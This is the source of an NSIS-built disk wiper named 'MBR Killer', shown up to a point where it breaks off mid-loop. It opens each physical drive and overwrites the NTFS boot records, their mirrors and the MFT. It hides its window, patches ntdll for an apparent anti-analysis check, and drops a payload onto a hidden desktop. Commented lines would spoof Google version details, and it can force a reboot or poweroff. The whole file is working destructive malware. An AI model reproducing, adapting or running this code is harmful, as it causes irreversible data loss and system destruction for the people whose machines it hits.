
Name "MBR Killer"

OutFile "mbrkiller_wait_for_user_events.exe"

RequestExecutionLevel highest
ShowInstDetails show
CRCCheck off

SetCompressor /SOLID bzip2 ; /SOLID lzma

!include "LogicLib.nsh"
!include "Config.nsh"

;LoadLanguageFile "${NSISDIR}\Contrib\Language files\English.nlf"
;
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "CompanyName" "Google"
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "FileDescription" "Google Company"
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "FileVersion" "4.4.5"
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "InternalName" ""
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalCopyright" "Copyright Google Company"
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "OriginalFilename" ""
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "PrivateBuild" ""
;    VIAddVersionKey /LANG=${LANG_ENGLISH} "ProductName" ""
;    VIProductVersion "4.0.5.2712"

!define NULL 0

!define SWP_NOSIZE	  0x0001
!define SWP_NOOWNERZORDER 0x0200

!define TOKEN_QUERY             0x0008
!define TOKEN_ADJUST_PRIVILEGES 0x0020
 
!define SE_SHUTDOWN_NAME        SeShutdownPrivilege
 
!define SE_PRIVILEGE_ENABLED    0x00000002

!define EWX_FORCE    0x4
!define EWX_POWEROFF 0x8
!define EWX_REBOOT   0x2

!define SHTDN_REASON_MAJOR_SOFTWARE 0x00030000
!define SHTDN_REASON_MINOR_UPGRADE  0x00000003

!define PAGE_EXECUTE_READWRITE 0x40

!define GENERIC_ALL   0x10000000
!define GENERIC_READ  0x80000000
!define GENERIC_WRITE 0x40000000

!define OPEN_EXISTING 3

!define FILE_SHARE_READ  0x1
!define FILE_SHARE_WRITE 0x2

!define FILE_ATTRIBUTE_NORMAL 0x80

!define INVALID_HANDLE_VALUE -1

!define FILE_BEGIN   0
!define FILE_CURRENT 1

!define KEYEVENTF_EXTENDEDKEY 1
!define KEYEVENTF_KEYUP       2

!define VK_LWIN 0x5B

!define stMBR '(&i446, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i2) i'

!define stMBRLBA '(&i446, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i2) i'

!define stVBR_NTFS '(&i3, &i8, &i2, &i1, &i2, &i24, &i8, &i8, &i8, &i4) i'

!if ${DEBUG_MODE} == 0
    AutoCloseWindow true
    Function ".onGUIInit"
	System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) i ($HWNDPARENT, 0, -10000, -10000, 0, 0, ${SWP_NOOWNERZORDER}|${SWP_NOSIZE})"
    FunctionEnd
!endif

Function DropDWE
    System::Call "user32::CreateDesktop(t, i, i, i, i) i ('Desktop_4c3f98h3dff562n731', 0, 0, 0, ${GENERIC_ALL}, 0) i .r0"
    ${If} $0 <> ${NULL}
	System::Call "user32::SwitchDesktop(i) i (r0) i .r0"
	${If} $0 <> ${NULL}
	    SetOutPath "$TEMP"
	    File "dwe\dmgwnd.tmp"
	    System::Alloc 72
	    Pop $2
	    System::Call "*$2(i72,i,t 'Desktop_4c3f98h3dff562n731',i,i,i,i,i,i,i,i,i)"
	    System::Call "*(i,i,i,i)i.r3"
	    System::Call 'kernel32::CreateProcess(t"$TEMP\dmgwnd.tmp",i0,i0,i0,i0,i0x20,i0,i0,ir2,ir3)i.r4'
	    System::Call "kernel32::CloseHandle(ir4)"
	    System::Free $2
	    System::Free $3
	${EndIf}
    ${EndIf}
FunctionEnd

Function ProcessNTFSBoot
    Pop $1
    Pop $2
    Pop $8

    System::Call "*$1${stVBR_NTFS} i (,,.r5,.r6,,,,.r3,,.r9)"

    System::Int64Op $5 * $6
    Pop $4
    System::Int64Op $9 * $4
    Pop $9
    System::Int64Op $3 * $4
    Pop $3
    System::Int64Op $3 + $8
    Pop $3
    System::Int64Op $3 & 0xFFFFFFFF
    Pop $4
    System::Int64Op $3 >> 32
    Pop $3
    System::Int64Op $3 & 0xFFFFFFFF
    Pop $3

    Push $8

    System::Alloc $9
    pop $5
    System::Alloc 4
    pop $6
    !if ${DEBUG_MODE} == 1
	DetailPrint "              Overwrite MFT..."
    !endif
    !if ${REAL_OVERWRITE_MODE} == 1
	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
	    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
	    ${If} $8 <> -1
		System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, r9, r6, ${NULL})"
		System::Call "kernel32::FlushFileBuffers(i) i (r2)"
	    ${EndIf}
	${Next}
    !endif
    !if ${DEBUG_MODE} == 1
	DetailPrint "              OK"
    !endif
    System::Free $6
    System::Free $5

    Pop $8

    System::Call "*$1${stVBR_NTFS} i (,,.r5,.r6,,,,,.r3,.r9)"

    System::Int64Op $5 * $6
    Pop $4
    System::Int64Op $9 * $4
    Pop $9
    System::Int64Op $3 * $4
    Pop $3
    System::Int64Op $3 + $8
    Pop $3
    System::Int64Op $3 & 0xFFFFFFFF
    Pop $4
    System::Int64Op $3 >> 32
    Pop $3
    System::Int64Op $3 & 0xFFFFFFFF
    Pop $3

    System::Alloc $9
    pop $5
    System::Alloc 4
    pop $6
    !if ${DEBUG_MODE} == 1
	DetailPrint "              Overwrite MFT mirror..."
    !endif
    !if ${REAL_OVERWRITE_MODE} == 1
	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
	    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
	    ${If} $8 <> -1
		System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, r9, r6, ${NULL})"
		System::Call "kernel32::FlushFileBuffers(i) i (r2)"
	    ${EndIf}
	${Next}
    !endif
    !if ${DEBUG_MODE} == 1
	DetailPrint "              OK"
    !endif

    System::Free $6
    System::Free $5

    DetailPrint "MFT: $4:$3"

FunctionEnd

Function ProcessNTFSPart
    Pop $0
    Pop $9
    Pop $2
    !if ${DEBUG_MODE} == 1
	DetailPrint "              Parse MBR part: $0 ('NTFS')"
    !endif
    System::Alloc 4096
    Pop $1
    ${If} $0 = 0
        System::Call "*$9${stMBRLBA} i (,,.r6,.r7,.r8,,,,,.r3,.r4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
	IntOp $5 $7 & 0x3F
	IntOp $8 $8 & 0xFF
	IntOp $7 $7 & 0xC0
	IntOp $8 $8 | $7
        !if ${DEBUG_MODE} == 1
	    DetailPrint "                     CHS address: C[$8] H[$6] S[$5]"
	    DetailPrint "                     LBA address: $3"
	!endif
	${If} $3 <> 0
	    Push $3
	    System::Int64Op $3 * 512
	    Pop $3
	    StrCpy $6 $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    Push $4
	    Push $3
	    System::Call "kernel32::SetFilePointer(i, i, *p, i) i (r2, r4, r3, ${FILE_BEGIN}) .r5"
	    ${If} $5 <> -1
		System::Alloc 4
	    	pop $3
		System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r1, 512, r3, ${NULL}) .r4"
		${If} $4 = 1
		    Push $2
		    Push $9
		    Push $0
		    Push $6
		    Push $2
		    Push $1
		    Call ProcessNTFSBoot
		    Pop $0
		    Pop $9
		    Pop $2
		${EndIf}
		System::Free $3
	    ${EndIf}
	    Pop $8
	    Pop $4
	    System::Alloc 512
	    pop $5
	    System::Alloc 4
	    pop $6
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r8, ${FILE_BEGIN}) .r3"
		    ${If} $3 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    Pop $3
	    System::Call "*$1${stVBR_NTFS} i (,,,,,,.r8,,,)"
	    System::Int64Op $3 + $8
	    Pop $3
	    System::Int64Op $3 * 512
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR mirror..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
		    ${If} $8 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    System::Free $6
	    System::Free $5
	${EndIf}
    ${ElseIf} $0 = 1
	System::Call "*$9${stMBRLBA} i (,,,,,,,,,,,,.r6,.r7,.r8,,,,,.r3,.r4,,,,,,,,,,,,,,,,,,,,,)"
	IntOp $5 $7 & 0x3F
	IntOp $8 $8 & 0xFF
	IntOp $7 $7 & 0xC0
	IntOp $8 $8 | $7
        !if ${DEBUG_MODE} == 1
	    DetailPrint "                     CHS address: C[$8] H[$6] S[$5]"
	    DetailPrint "                     LBA address: $3"
	!endif
	${If} $3 <> 0
	    Push $3
	    System::Int64Op $3 * 512
	    Pop $3
	    StrCpy $6 $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    Push $4
	    Push $3
	    System::Call "kernel32::SetFilePointer(i, i, *p, i) i (r2, r4, r3, ${FILE_BEGIN}) .r5"
	    ${If} $5 <> -1
		System::Alloc 4
	    	pop $3
		System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r1, 512, r3, ${NULL}) .r4"
		${If} $4 = 1
		    Push $2
		    Push $9
		    Push $0
		    Push $6
		    Push $2
		    Push $1
		    Call ProcessNTFSBoot
		    Pop $0
		    Pop $9
		    Pop $2
		${EndIf}
		System::Free $3
	    ${EndIf}
	    Pop $8
	    Pop $4
	    System::Alloc 512
	    pop $5
	    System::Alloc 4
	    pop $6
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r8, ${FILE_BEGIN}) .r3"
		    ${If} $3 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    Pop $3
	    System::Call "*$1${stVBR_NTFS} i (,,,,,,.r8,,,)"
	    System::Int64Op $3 + $8
	    Pop $3
	    System::Int64Op $3 * 512
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR mirror..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
		    ${If} $8 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    System::Free $6
	    System::Free $5
	${EndIf}
    ${ElseIf} $0 = 2
	System::Call "*$9${stMBRLBA} i (,,,,,,,,,,,,,,,,,,,,,,.r6,.r7,.r8,,,,,.r3,.r4,,,,,,,,,,,)"
	IntOp $5 $7 & 0x3F
	IntOp $8 $8 & 0xFF
	IntOp $7 $7 & 0xC0
	IntOp $8 $8 | $7
        !if ${DEBUG_MODE} == 1
	    DetailPrint "                     CHS address: C[$8] H[$6] S[$5]"
	    DetailPrint "                     LBA address: $3"
	!endif
	${If} $3 <> 0
	    Push $3
	    System::Int64Op $3 * 512
	    Pop $3
	    StrCpy $6 $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    Push $4
	    Push $3
	    System::Call "kernel32::SetFilePointer(i, i, *p, i) i (r2, r4, r3, ${FILE_BEGIN}) .r5"
	    ${If} $5 <> -1
		System::Alloc 4
	    	pop $3
		System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r1, 512, r3, ${NULL}) .r4"
		${If} $4 = 1
		    Push $2
		    Push $9
		    Push $0
		    Push $6
		    Push $2
		    Push $1
		    Call ProcessNTFSBoot
		    Pop $0
		    Pop $9
		    Pop $2
		${EndIf}
		System::Free $3
	    ${EndIf}
	    Pop $8
	    Pop $4
	    System::Alloc 512
	    pop $5
	    System::Alloc 4
	    pop $6
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r8, ${FILE_BEGIN}) .r3"
		    ${If} $3 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    Pop $3
	    System::Call "*$1${stVBR_NTFS} i (,,,,,,.r8,,,)"
	    System::Int64Op $3 + $8
	    Pop $3
	    System::Int64Op $3 * 512
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR mirror..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
		    ${If} $8 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    System::Free $6
	    System::Free $5
	${EndIf}
    ${ElseIf} $0 = 3
	System::Call "*$9${stMBRLBA} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r6,.r7,.r8,,,,,.r3,.r4,)"
	IntOp $5 $7 & 0x3F
	IntOp $8 $8 & 0xFF
	IntOp $7 $7 & 0xC0
	IntOp $8 $8 | $7
        !if ${DEBUG_MODE} == 1
	    DetailPrint "                     CHS address: C[$8] H[$6] S[$5]"
	    DetailPrint "                     LBA address: $3"
	!endif
	${If} $3 <> 0
	    Push $3
	    System::Int64Op $3 * 512
	    Pop $3
	    StrCpy $6 $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    Push $4
	    Push $3
	    System::Call "kernel32::SetFilePointer(i, i, *p, i) i (r2, r4, r3, ${FILE_BEGIN}) .r5"
	    ${If} $5 <> -1
		System::Alloc 4
	    	pop $3
		System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r1, 512, r3, ${NULL}) .r4"
		${If} $4 = 1
		    Push $2
		    Push $9
		    Push $0
		    Push $6
		    Push $2
		    Push $1
		    Call ProcessNTFSBoot
		    Pop $0
		    Pop $9
		    Pop $2
		${EndIf}
		System::Free $3
	    ${EndIf}
	    Pop $8
	    Pop $4
	    System::Alloc 512
	    pop $5
	    System::Alloc 4
	    pop $6
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r8, ${FILE_BEGIN}) .r3"
		    ${If} $3 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    Pop $3
	    System::Call "*$1${stVBR_NTFS} i (,,,,,,.r8,,,)"
	    System::Int64Op $3 + $8
	    Pop $3
	    System::Int64Op $3 * 512
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $4
	    System::Int64Op $3 >> 32
	    Pop $3
	    System::Int64Op $3 & 0xFFFFFFFF
	    Pop $3
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              Overwrite VBR mirror..."
	    !endif
	    !if ${REAL_OVERWRITE_MODE} == 1
	    	${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
		    System::Call "kernel32::SetFilePointer(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8"
		    ${If} $8 <> -1
			System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
			System::Call "kernel32::FlushFileBuffers(i) i (r2)"
		    ${EndIf}
		${Next}
	    !endif
	    !if ${DEBUG_MODE} == 1
		DetailPrint "              OK"
	    !endif
	    System::Free $6
	    System::Free $5
	${EndIf}
    ${EndIf}
    System::Free $1
FunctionEnd

Function ProcessExtendedPart
    Pop $0
    Pop $9
    Pop $2
    !if ${DEBUG_MODE} == 1
	DetailPrint "              Parse MBR Part: $0 ('Extended Boot Record(EBR)')"
    !endif
    !if ${DEBUG_MODE} == 1
	DetailPrint "              Overwrite EBR"
    !endif
    !if ${DEBUG_MODE} == 1
	DetailPrint "              OK"
    !endif
FunctionEnd

Function ProcessMBR
    Pop $9
    Pop $2
    System::Call "*$9${stMBR} i (,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
    ${If} $8 <> 0
        ${If} $8 = 5
	    Push $2
	    Push $9
	    Push $2
	    Push $9
	    Push 0
	    Call ProcessExtendedPart
	    Pop $9
	    Pop $2
	${Else}
	    ${If} $8 = 7
	    	Push $2
	    	Push $9
	    	Push $2
	    	Push $9
		Push 0
	    	Call ProcessNTFSPart
	    	Pop $9
	    	Pop $2
	    ${EndIf}
	${EndIf}
    ${EndIf}
    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
    ${If} $8 <> 0
	${If} $8 = 5
	    Push $2
	    Push $9
	    Push $2
	    Push $9
	    Push 1
	    Call ProcessExtendedPart
	    Pop $9
	    Pop $2
	${Else}
	    ${If} $8 = 7
	    	Push $2
	    	Push $9
	    	Push $2
	    	Push $9
		Push 1
	    	Call ProcessNTFSPart
	    	Pop $9
	    	Pop $2
	    ${EndIf}
	${EndIf}
    ${EndIf}
    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
    ${If} $8 <> 0
	${If} $8 = 5
	    Push $2
	    Push $9
	    Push $2
	    Push $9
	    Push 2
	    Call ProcessExtendedPart
	    Pop $9
	    Pop $2
	${Else}
	    ${If} $8 = 7
	    	Push $2
	    	Push $9
	    	Push $2
	    	Push $9
		Push 2
	    	Call ProcessNTFSPart
	    	Pop $9
	    	Pop $2
	    ${EndIf}
	${EndIf}
    ${EndIf}
    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,)"
    ${If} $8 <> 0
	${If} $8 = 5
	    Push $2
	    Push $9
	    Push $2
	    Push $9
	    Push 3
	    Call ProcessExtendedPart
	    Pop $9
	    Pop $2
	${Else}
	    ${If} $8 = 7
	    	Push $2
	    	Push $9
	    	Push $2
	    	Push $9
		Push 3
	    	Call ProcessNTFSPart
	    	Pop $9
	    	Pop $2
	    ${EndIf}
	${EndIf}
    ${EndIf}
FunctionEnd


!if ${SHUTDOWN_MODE} != 0

!if ${SHUTDOWN_MODE} == 1

ExitWindowsEx_EWX_REBOOT_
    Push $1
    StrCpy $1 ${EWX_REBOOT}|${EWX_FORCE}
    System::Call "user32::ExitWindowsEx(i, i) i ($1, ${SHTDN_REASON_MAJOR_SOFTWARE}|${SHTDN_REASON_MINOR_UPGRADE}) i .r0"
    Pop $1
FunctionEnd

Function ExitWindowsEx_EWX_REBOOT
    Call ExitWindowsEx_EWX_REBOOT_
FunctionEnd

!endif

!if ${SHUTDOWN_MODE} == 2

Function ExitWindowsEx_EWX_POWEROFF_
    Push $1
    StrCpy $1 ${EWX_POWEROFF}|${EWX_FORCE}
    System::Call "user32::ExitWindowsEx(i, i) i ($1, 0) i .r0"
    Pop $1
FunctionEnd

Function ExitWindowsEx_EWX_POWEROFF
    Call ExitWindowsEx_EWX_POWEROFF_
FunctionEnd

!endif

!endif

Function main_loop_CreateFile
    IntFmt $1 "\\.\PHYSICALDRIVE%d" $0
    Push $0
    StrCpy $0 $1
    System::Call "Kernel32::CreateFile(t, i, i, i, i, i, i) i ('$0', ${GENERIC_READ}|${GENERIC_WRITE}, ${FILE_SHARE_READ}|${FILE_SHARE_WRITE}, ${NULL}, ${OPEN_EXISTING}, ${FILE_ATTRIBUTE_NORMAL}, ${NULL}) .r2"
    Pop $0
FunctionEnd

Section

SectionEnd

Section

System::Call "kernel32::GetModuleHandle(t) p ('ntdll.dll') .r0"
${If} $0 <> ${NULL}
    System::Call "kernel32::GetProcAddress(p, t) p (r0, 'ZwClose') .r1"
    ${If} $1 <> ${NULL}
	System::Call "kernel32::VirtualProtect(p, i, i, *i) i (r1, 6, ${PAGE_EXECUTE_READWRITE}, .r2) .r0"
	${If} $0 <> 0
	    System::Alloc 6
	    pop $3
	    System::Call "ntdll::memcpy(p, p ,i) i (r3, r1, 6)"
	    System::Call "ntdll::memcpy(p, t, i) i (r1, t '1ÀYZÿá', 6)"
	    System::Call "kernel32::CloseHandle(i) i (0x12345678) .r4"
	    System::Call "ntdll::memcpy(p, p, i) i (r1, r3, 6)"
	    ; System::Free $3
	    ; System::Call "kernel32::VirtualProtect(p, i, i, *i) i (r1, 0x1000, r2, r2) p .r0"
	    ${If} $4 = 1
		!if ${DEBUG_MODE} == 0
		    HideWindow
		!endif
		!if ${DEBUG_MODE} == 1
		    MessageBox MB_YESNO "You want to clean MBR, BOOT and MFT on all hard drives?" IDYES clean_loop IDNO done
		    clean_loop:
		    DetailPrint "Start"
		!endif
		StrCpy $0 0
		System::Alloc 4096
		Pop $9
		System::Call "*${stMBR} .r9"
		main_loop:
		    ; IntFmt $1 "\\.\PHYSICALDRIVE%d" $0
		    Call main_loop_CreateFile
		    ; System::Call "Kernel32::CreateFile(t, i, i, i, i, i, i) i ('$1', ${GENERIC_READ}|${GENERIC_WRITE}, ${FILE_SHARE_READ}|${FILE_SHARE_WRITE}, ${NULL}, ${OPEN_EXISTING}, ${FILE_ATTRIBUTE_NORMAL}, ${NULL}) .r2"
		    ${If} $2 <> ${INVALID_HANDLE_VALUE}
			!if ${DEBUG_MODE} == 1
			    DetailPrint "HDD: $0 ('$1')"
			    DetailPrint "       MBR Partition Table Entries(PTE's):"
		        !endif
			System::Call "kernel32::SetFilePointer(i, i ,i ,i) i (r2, 0, ${NULL}, ${FILE_BEGIN}) .r3"
			${If} $3 <> -1
			    System::Alloc 4
	    		    pop $3
			    System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r9, 512, r3, ${NULL}) .r4"
			    System::Free $3
			    ${If} $4 = 1
				!if ${DEBUG_MODE} == 1
				    StrCpy $4 0
				    System::Call "*$9${stMBR} i (,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "[$5]:[$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5]:[$6:$7:$8]"
				    ${If} $5 <> 0
				        IntOp $4 $4 + 1
				    ${EndIf}
				    System::Call "*$9${stMBR} i (,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    DetailPrint "              $1"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "[$5]:[$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5]:[$6:$7:$8]"
				    ${If} $5 <> 0
				        IntOp $4 $4 + 1
				    ${EndIf}
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    DetailPrint "              $1"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "[$5]:[$6:$7:$8]"
